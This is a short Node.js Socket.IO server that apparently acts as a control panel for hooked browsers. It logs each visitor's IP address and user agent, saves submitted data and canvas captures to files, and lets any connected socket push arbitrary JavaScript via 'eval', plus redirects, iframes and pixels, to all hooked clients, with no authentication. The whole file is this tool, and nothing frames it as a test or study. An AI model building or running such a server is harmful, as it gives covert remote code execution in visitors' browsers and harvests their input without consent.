var express = require('express');
var app = express()
var server = app.listen(3000);
var io = require('socket.io')(server);
var fs = require('fs');

function log(type, file, data) {
  if(type == 'VERBOSE') {
    fs.appendFile(file, JSON.stringify(data) + '\r\n');
    console.log(data);
  }
  else if (type == 'FILE') {
    fs.appendFile(file, JSON.stringify(data) + '\r\n');
  }
}

app.use(express.static('static'));

io.on('connection', function (socket) {

  // client
  socket.on('client', function(data) {
    socket.join('clients');
    log('VERBOSE', 'log.txt', {
      ip: socket.handshake.address,
      useragent: socket.handshake.headers['user-agent'] });
  });

  // submit
  socket.on('submit', function(data) {
    log('VERBOSE', 'log.txt', { submit: data });
  });

  // canvas
  socket.on('canvas', function(data) {
    log('FILE', 'canvas.txt', { canvas: data });
  });

  // admin
  socket.on('admin', function(data) {
    var clientsRoom = socket.nsp.adapter.rooms.clients || {};
    socket.emit('admin', Object.keys(clientsRoom).length); // number of clients currently online
  });

  // eval
  socket.on('eval', function(data) {
    socket.to('clients').emit('eval', data);
  });

  // redirect
  socket.on('redirect', function(data) {
    socket.to('clients').emit('redirect', data);
  });

  // pixel
  socket.on('pixel', function(data) {
    socket.to('clients').emit('pixel', data);
  });

  // iframe
  socket.on('iframe', function(data) {
    socket.to('clients').emit('iframe', data);
  });

});
